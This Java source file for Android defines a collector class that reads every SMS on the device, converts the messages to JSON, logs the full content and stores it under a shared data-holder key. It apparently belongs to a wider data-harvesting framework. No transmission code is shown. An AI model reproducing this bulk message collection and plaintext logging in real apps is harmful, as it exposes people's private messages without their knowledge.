package com.xaviar.collect.sms;

import java.util.List;

import android.content.Context;
import android.util.Log;

import com.xaviar.frm.DataHolder;
import com.xaviar.frm.ICollector;
import com.xaviar.frm.ThreadCollector;

public class CollectSms extends ThreadCollector implements ICollector {

	private  static String name = "CollectSms";
	private static final String TAG = name;
	
	

	public CollectSms(String genericData) {
		this.genericData = genericData;
	}
	
	public CollectSms() {
		setName(CollectSms.name);
	}


	public CollectSms(Context ctx) {
		setContext(ctx);
	}

	@Override
	protected String getAllData() {
		Log.d(TAG,"Enter sms getAllData()");
		List<Sms> allSms = SmsUtil.getAllSms(ctx);
       genericData =  translateContactEntityToGeneric(allSms);		
		return genericData;
	}
	
	private String translateContactEntityToGeneric(List<Sms> allSms) {
		Log.d(TAG,"Enter translateContactEntityToGeneric()");
		int size = 0;
		if (allSms != null)
		{
		 size = allSms.size();
		 }
		String ret = SmsUtil.toJsonArray(allSms);
		Log.d(TAG,"ret:" + ret);
		
		Log.d(TAG,"Num of contacts entry:" + size);
		return ret;
	}
	
	@Override
	public String getHolderKey() {
		return DataHolder.SMS;
	}
	

}
